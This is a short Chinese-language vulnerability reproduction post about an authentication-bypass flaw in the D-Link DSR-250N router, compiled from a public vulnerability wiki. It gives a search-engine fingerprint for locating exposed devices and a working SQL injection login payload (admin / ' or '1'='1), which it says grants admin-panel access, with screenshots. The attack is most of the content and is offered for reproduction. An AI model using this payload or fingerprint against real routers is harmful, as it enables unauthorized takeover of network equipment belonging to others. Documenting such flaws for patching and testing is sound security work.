---
title: "D-Link DSR-250N 万能密码漏洞"
date: 2026-10-18 09:14:23
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "D-Link"
tags:
  - "D-Link"
  - "漏洞复现"
---
## 漏洞描述

D-Link DSR-250N 存在万能密码漏洞，攻击者通过漏洞可以获取后台权限

## 漏洞影响

```
D-Link DSR-250N
```

## 网络测绘

```
app="D_Link-DSR-250N"
```

## 漏洞复现

登录页面如下

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202162222919.png)

```plain
user: admin
pass: ' or '1'='1
```

成功登录后台

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202162223338.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/D-Link-DSR-250N-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E.md)
